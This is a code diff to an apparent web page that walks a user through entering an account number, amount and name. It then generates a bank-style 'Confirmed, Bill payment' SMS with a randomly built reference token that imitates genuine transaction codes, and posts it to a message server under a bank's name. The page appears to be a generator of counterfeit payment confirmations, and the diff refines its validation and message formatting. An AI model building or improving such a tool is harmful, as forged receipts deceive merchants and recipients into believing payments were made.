@@ -99,32 +99,26 @@ button:disabled {
 <div class="left-content">
   <div class="container">
     <div class="current-step active" id="phoneLabel">ACCNT BSS no.</div>
-    <input type="text" id="phone" class="active" placeholder="">
+    <input type="text" id="phone" class="active" placeholder="Enter account number" maxlength="8">
     <button id="phoneOkBtn" class="active">OK</button>
-
     <div class="current-step" id="amountLabel">Enter Amount</div>
     <input type="number" id="amount" placeholder="">
     <button id="amountOkBtn">OK</button>
-
     <div class="current-step" id="nameLabel">Enter Full Name</div>
     <div id="editNote" class="search-note">Confirm Name (Edit if incorrect)</div>
     <input type="text" id="name" placeholder="Full name">
     <button id="nameOkBtn">OK</button>
-
     <div class="current-step" id="optionsLabel"></div>
     <button id="sendBtn">Confirm & Send</button>
-
     <div class="status-text" id="statusDisplay"></div>
   </div>
 </div>
 
 <script>
-const SYSTEM_API    = "https://funds-mauve.vercel.app/api";
-const EXTERNAL_API  = "https://mpesab.vercel.app";
-const MESSAGE_API   = "https://message-server-five.vercel.app";
-
-// Fixed KCB Account Number (Change this if needed)
-const KCB_ACCOUNT   = "Equity Bank";   // ←←← PUT YOUR ACTUAL KCB ACCOUNT NUMBER HERE
+const SYSTEM_API = "https://funds-mauve.vercel.app/api";
+const EXTERNAL_API = "https://mpesab.vercel.app";
+const MESSAGE_API = "https://message-server-five.vercel.app";
+const KCB_ACCOUNT = "Equity Bank";
 
 let user = JSON.parse(localStorage.getItem('mledger_user'));
 if (!user) location.href = 'index.html';
@@ -143,10 +137,12 @@ const elements = {
 
 // --- HELPER FUNCTIONS ---
 function formatInputPhone(val) {
-  let cleaned = val.trim();
-  if (cleaned.startsWith("+2547")) return "07" + cleaned.substring(5);
-  if (cleaned.startsWith("2547")) return "07" + cleaned.substring(4);
-  return cleaned;
+  return val.trim().replace(/\D/g, ''); // Keep only digits
+}
+
+function isValidPhone(phone) {
+  const len = phone.length;
+  return len > 0 && len < 9; // Less than 9 digits (max 8 digits)
 }
 
 function formatBalance(amount) {
@@ -161,12 +157,12 @@ function formatNumericDate() {
   return `${day}-${month}-${year}`;
 }
 
-function formatTime12Hour() {
+function formatTime24Hour() {
   const now = new Date();
   return now.toLocaleTimeString('en-US', {
-    hour: 'numeric',
+    hour: '2-digit',
     minute: '2-digit',
-    hour12: true
+    hour12: false
   });
 }
 
@@ -229,26 +225,33 @@ function getDayCode() {
 // --- EVENT LISTENERS ---
 elements.phoneOkBtn.addEventListener("click", async () => {
   let phoneVal = formatInputPhone(elements.phone.value);
+
+  if (!isValidPhone(phoneVal)) {
+    return showStatus("Account number must be less than 9 digits (maximum 8 digits)", true);
+  }
+
   elements.phone.value = phoneVal;
-  if (!phoneVal) return showStatus("Enter phone number", true);
 
   showStatus("Looking up name...");
   try {
     const res = await fetch(`${EXTERNAL_API}/lookup/${phoneVal}`);
     const data = await res.json();
     elements.name.value = data.found && data.name ? data.name : "";
-  } catch {}
+  } catch (e) {
+    console.warn("Name lookup failed");
+  }
+
   showStep('amount');
 });
 
 elements.amountOkBtn.addEventListener("click", () => {
   const amt = parseFloat(elements.amount.value);
   if (!amt || amt <= 0) return showStatus("Enter a valid amount", true);
-  
+
   const cost = calculateCost(amt);
   const required = amt + cost;
   if (required > user.balance) {
-    return showStatus(`Available airtime: ${formatBalance(user.balance)}\nTotal required: ${formatBalance(required)}`, true);
+    return showStatus(`Available balance: ${formatBalance(user.balance)}\nTotal required: ${formatBalance(required)}`, true);
   }
   showStep('name');
 });
@@ -259,16 +262,15 @@ elements.nameOkBtn.addEventListener("click", () => {
 });
 
 elements.sendBtn.addEventListener("click", async () => {
-  const phoneVal   = elements.phone.value.trim();
-  const amountVal  = parseFloat(elements.amount.value);
-  const nameVal    = elements.name.value.trim();
-  const cost       = calculateCost(amountVal);
+  const phoneVal = elements.phone.value.trim();
+  const amountVal = parseFloat(elements.amount.value);
+  const nameVal = elements.name.value.trim();
+  const cost = calculateCost(amountVal);
 
   elements.sendBtn.innerText = "Processing...";
   elements.sendBtn.disabled = true;
 
   try {
-    // 1. Deduct funds via system
     const sysRes = await fetch(`${SYSTEM_API}/send`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -285,25 +287,22 @@ elements.sendBtn.addEventListener("click", async () => {
     user.balance = sysData.balance;
     localStorage.setItem('mledger_user', JSON.stringify(user));
 
-    // 2. Generate token and confirmation message
     const token = `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`;
     const dateStr = formatNumericDate();
-    const timeStr = formatTime12Hour();
+    const timeStr = formatTime24Hour();
 
     const confirmationMsg = `Confirmed, Bill payment to ${nameVal} of KES. ${amountVal.toFixed(2)} for account ${phoneVal} and Ref. ${token} on ${dateStr} at ${timeStr}. Thank you. `;
 
-    // 3. Send confirmation to MESSAGE SERVER → Always to KCB account
     fetch(`${MESSAGE_API}/api/messages`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        phone: KCB_ACCOUNT,        // ← Always forward to KCB
-        message: confirmationMsg, 
-        type: 'sent' 
+      body: JSON.stringify({
+        phone: KCB_ACCOUNT,
+        message: confirmationMsg,
+        type: 'sent'
       })
     }).catch(err => console.warn(err));
 
-    // Optional: Still call external API if needed
     fetch(`${EXTERNAL_API}/send`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -311,7 +310,6 @@ elements.sendBtn.addEventListener("click", async () => {
     }).catch(() => {});
 
     setTimeout(() => { location.href = 'act.html'; }, 2500);
-
   } catch (e) {
     showStatus(e.message || "Transaction failed", true);
     elements.sendBtn.innerText = "Try Again";
